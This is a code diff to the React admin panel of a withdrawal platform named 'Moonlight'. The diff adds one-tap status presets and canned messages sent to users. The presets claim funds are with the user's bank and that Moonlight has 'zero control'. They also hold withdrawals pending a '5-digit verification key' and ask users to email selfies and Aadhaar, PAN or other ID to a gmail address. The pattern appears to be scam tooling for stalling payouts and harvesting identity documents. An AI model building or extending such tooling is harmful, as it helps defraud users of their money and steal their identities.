@@ -543,7 +543,7 @@ function Admin() {
         )}
         {section === "kyc" && <KycSection token={token} />}
         {section === "activity" && <ActivitySection token={token} />}
-        {section === "emails" && <EmailTemplatesSection />}
+        {section === "emails" && <EmailTemplatesSection withdrawals={withdrawals} users={users} />}
       </main>
     </div>
   );
@@ -681,7 +681,7 @@ function OverviewSection({
                     reference: t.reference,
                     date: new Date(t.created_at).toLocaleString(),
                     status: "COMPLETED",
-                    destination: t.recipient_name || "Bank Account",
+                    destination: (t as any).upi_id || (t as any).destination || (t as any).account_number || (t as any).recipient_wallet_code || t.recipient_name || "Bank Account",
                     recipientEmail: (t as any).email || undefined,
                     recipientPhone: (t as any).phone || undefined,
                   }}
@@ -1378,15 +1378,15 @@ function WithdrawalsSection({
                       handleQuickBatchStatus(
                         batch,
                         "SUCCESSFUL",
-                        "Settlement cleared and funds dispatched to destination account.",
+                        "Moonlight operations 100% completed. Outbound transaction has been transmitted to your receiving bank for routine inward clearance. Moonlight has zero control over funds now; money will reflect directly in your account upon bank review completion.",
                       )
                     }
                     className="inline-flex items-center gap-1 h-8 px-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white text-[11px] font-bold transition-colors cursor-pointer shadow-2xs disabled:opacity-50"
-                    title="Final settlement: Release funds and mark as dispatched / credited"
+                    title="Final settlement: Dispatched to user bank for review (zero Moonlight control)"
                   >
                     <CheckCircle2 className="h-3 w-3" />
                     <span>
-                      {batch.count > 1 ? `Final Settle All (${batch.count})` : "Approve & Settle"}
+                      {batch.count > 1 ? `Final Settle All (${batch.count})` : "🏛️ Final Settlement (Sent to Bank)"}
                     </span>
                   </button>
                 )}
@@ -1496,17 +1496,125 @@ function WithdrawalsSection({
               )}
             </div>
 
-            <div className="space-y-1.5">
-              <label className="text-xs font-semibold text-foreground">Target Withdrawal Status</label>
+            <div className="space-y-2">
+              <label className="text-xs font-semibold text-foreground flex items-center justify-between">
+                <span>Target Withdrawal Status</span>
+                <span className="text-[10px] text-primary font-normal">Choose preset or select below</span>
+              </label>
+
+              {/* 1-Tap Quick Action Presets */}
+              <div className="space-y-1">
+                <span className="text-[10px] font-semibold uppercase text-muted-foreground tracking-wider block">
+                  1-Tap Status &amp; Reason Presets:
+                </span>
+                <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5">
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setNewStatus("SUCCESSFUL");
+                      setStatusReason(
+                        "Moonlight operations 100% completed. Outbound transaction has been transmitted to your receiving bank for routine inward clearance. Moonlight has zero control over funds now; money will reflect directly in your account upon bank review completion.",
+                      );
+                    }}
+                    className={cn(
+                      "p-2 rounded-xl border text-left text-xs font-semibold transition-all cursor-pointer",
+                      newStatus === "SUCCESSFUL"
+                        ? "bg-emerald-500/20 border-emerald-500 text-emerald-700 dark:text-emerald-300 shadow-xs ring-1 ring-emerald-500/30"
+                        : "bg-secondary/60 border-border hover:bg-secondary text-muted-foreground hover:text-foreground",
+                    )}
+                  >
+                    <div className="text-[11px] font-bold flex items-center gap-1">
+                      <span>🏛️</span>
+                      <span>Final Settlement</span>
+                    </div>
+                    <div className="text-[10px] text-muted-foreground font-normal truncate">
+                      Sent to Bank for Review
+                    </div>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setNewStatus("UNDER REVIEW");
+                      setStatusReason(
+                        "KYC verified and approved. 5-digit verification key required to release funds from escrow.",
+                      );
+                    }}
+                    className={cn(
+                      "p-2 rounded-xl border text-left text-xs font-semibold transition-all cursor-pointer",
+                      newStatus === "UNDER REVIEW"
+                        ? "bg-blue-500/20 border-blue-500 text-blue-700 dark:text-blue-300 shadow-xs ring-1 ring-blue-500/30"
+                        : "bg-secondary/60 border-border hover:bg-secondary text-muted-foreground hover:text-foreground",
+                    )}
+                  >
+                    <div className="text-[11px] font-bold flex items-center gap-1">
+                      <span>🔑</span>
+                      <span>Key Needed</span>
+                    </div>
+                    <div className="text-[10px] text-muted-foreground font-normal truncate">
+                      5-Digit Key Hold
+                    </div>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setNewStatus("ON HOLD");
+                      setStatusReason(
+                        "Mandatory KYC verification required: Please email a live or recent photo matching your document, plus your ID (School ID, College ID, Library ID, Aadhaar, PAN, or Driving Licence) to moonlightwealthmanagement@gmail.com.",
+                      );
+                    }}
+                    className={cn(
+                      "p-2 rounded-xl border text-left text-xs font-semibold transition-all cursor-pointer",
+                      newStatus === "ON HOLD"
+                        ? "bg-amber-500/20 border-amber-500 text-amber-700 dark:text-amber-300 shadow-xs ring-1 ring-amber-500/30"
+                        : "bg-secondary/60 border-border hover:bg-secondary text-muted-foreground hover:text-foreground",
+                    )}
+                  >
+                    <div className="text-[11px] font-bold flex items-center gap-1">
+                      <span>🛡️</span>
+                      <span>KYC Verification</span>
+                    </div>
+                    <div className="text-[10px] text-muted-foreground font-normal truncate">
+                      Hold for ID / Photo
+                    </div>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setNewStatus("PROCESSING");
+                      setStatusReason(
+                        "Interbank clearing review in progress. Delivery window: 2–5 business days (concludes Day 5).",
+                      );
+                    }}
+                    className={cn(
+                      "p-2 rounded-xl border text-left text-xs font-semibold transition-all cursor-pointer",
+                      newStatus === "PROCESSING"
+                        ? "bg-purple-500/20 border-purple-500 text-purple-700 dark:text-purple-300 shadow-xs ring-1 ring-purple-500/30"
+                        : "bg-secondary/60 border-border hover:bg-secondary text-muted-foreground hover:text-foreground",
+                    )}
+                  >
+                    <div className="text-[11px] font-bold flex items-center gap-1">
+                      <span>⏳</span>
+                      <span>Processing</span>
+                    </div>
+                    <div className="text-[10px] text-muted-foreground font-normal truncate">
+                      Interbank Clearing
+                    </div>
+                  </button>
+                </div>
+              </div>
+
               <select
                 value={newStatus}
                 onChange={(e) => setNewStatus(e.target.value as WithdrawalStatus)}
-                className="h-11 w-full rounded-xl border border-input bg-background px-3 text-sm font-medium"
+                className="h-11 w-full rounded-xl border border-input bg-background px-3 text-sm font-semibold"
               >
+                <option value="SUCCESSFUL">🏛️ FINAL SETTLEMENT / SENT TO BANK (Moonlight 100% Cleared · Sent to Beneficiary Bank for Review)</option>
                 <option value="PROCESSING">PROCESSING (Interbank Clearing / Key Submitted)</option>
                 <option value="ON HOLD">ON HOLD (KYC Identity Verification Required)</option>
                 <option value="UNDER REVIEW">KEY NEEDED (5-Digit Key Hold / KYC Approved)</option>
-                <option value="SUCCESSFUL">SUCCESSFUL (Final Settlement Dispatched &amp; Credited)</option>
                 <option value="FAILED">FAILED (Cancel &amp; Refund to Wallet Balance)</option>
                 <option value="CANCELLED">CANCELLED (Cancel &amp; Refund to Wallet Balance)</option>
               </select>
@@ -1543,6 +1651,7 @@ function WithdrawalsSection({
                 </span>
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-1.5">
                   {[
+                    "Moonlight operations 100% completed. Outbound transaction has been transmitted to your receiving bank for routine inward clearance. Moonlight has zero control over funds now; money will reflect directly in your account upon bank review completion.",
                     "Verified and settled via banking rail.",
                     "Interbank clearing review in progress. Delivery window: 2–5 business days (concludes Day 5).",
                     "Mandatory KYC verification required: Please email a live or recent photo matching your document, plus your ID (School ID, College ID, Library ID, Aadhaar, PAN, or Driving Licence) to moonlightwealthmanagement@gmail.com.",
@@ -2708,7 +2817,7 @@ function TransactionsSection({ token }: { token: string }) {
                       date: dateStr,
                       status: statusUpper,
                       method: tx.method || (isWd ? "Unified Payments Interface (UPI)" : "Transfer"),
-                      destination: tx.recipient_name || "Bank Account",
+                      destination: (tx as any).upi_id || (tx as any).destination || (tx as any).account_number || tx.recipient_name || "Bank Account",
                       recipientEmail: (tx as any).email || undefined,
                       recipientPhone: (tx as any).phone || undefined,
                     }}
